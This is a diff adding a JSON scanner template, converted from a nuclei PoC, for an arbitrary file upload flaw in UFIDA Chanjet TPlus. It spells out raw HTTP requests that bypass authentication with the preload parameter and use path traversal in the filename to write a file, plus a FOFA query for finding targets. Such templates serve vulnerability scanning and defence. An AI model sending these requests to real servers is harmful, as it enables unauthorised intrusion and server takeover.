@@ -1,0 +1,122 @@
+{
+  "id": "chanjet-tplus-fileupload",
+  "name": "UFIDA Chanjet TPluse Upload.aspx - Arbitrary File Upload",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "There is an arbitrary file upload vulnerability in the Upload.aspx interface of UFIDA Chanjet TPlus. An attacker can use the preload parameter to bypass authentication to upload files and control the server.\n",
+  "references": [
+    "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT%2B%20Upload.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "yonyou",
+    "chanjet",
+    "upload",
+    "intrusive"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"畅捷通-TPlus\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /tplus/SM/SetupAccount/Upload.aspx?preload\u003d1 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary\u003d----WebKitFormBoundaryuirnbcvo\nAccept-Encoding: gzip\n\n------WebKitFormBoundaryuirnbcvo\nContent-Disposition: form-data; name\u003d\"File1\"; filename\u003d\"../../../img/login/{{randstr_1}}.jpg\"\nContent-Type: image/jpeg\n\n{{randstr_2}}\n------WebKitFormBoundaryuirnbcvo--\n",
+        "GET /tplus/img/login/{{randstr_1}}.jpg HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code_1\u003d\u003d200 \u0026\u0026 status_code_2\u003d\u003d200",
+            "contains(body_2, \u0027{{randstr_2}}\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "chanjet-tplus-fileupload",
+    "info": {
+      "name": "UFIDA Chanjet TPluse Upload.aspx - Arbitrary File Upload",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "There is an arbitrary file upload vulnerability in the Upload.aspx interface of UFIDA Chanjet TPlus. An attacker can use the preload parameter to bypass authentication to upload files and control the server.\n",
+      "reference": [
+        "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9AT%2B%20Upload.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "app\u003d\"畅捷通-TPlus\""
+      },
+      "tags": "yonyou,chanjet,upload,intrusive"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /tplus/SM/SetupAccount/Upload.aspx?preload\u003d1 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary\u003d----WebKitFormBoundaryuirnbcvo\nAccept-Encoding: gzip\n\n------WebKitFormBoundaryuirnbcvo\nContent-Disposition: form-data; name\u003d\"File1\"; filename\u003d\"../../../img/login/{{randstr_1}}.jpg\"\nContent-Type: image/jpeg\n\n{{randstr_2}}\n------WebKitFormBoundaryuirnbcvo--\n",
+          "GET /tplus/img/login/{{randstr_1}}.jpg HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code_1\u003d\u003d200 \u0026\u0026 status_code_2\u003d\u003d200",
+              "contains(body_2, \u0027{{randstr_2}}\u0027)"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
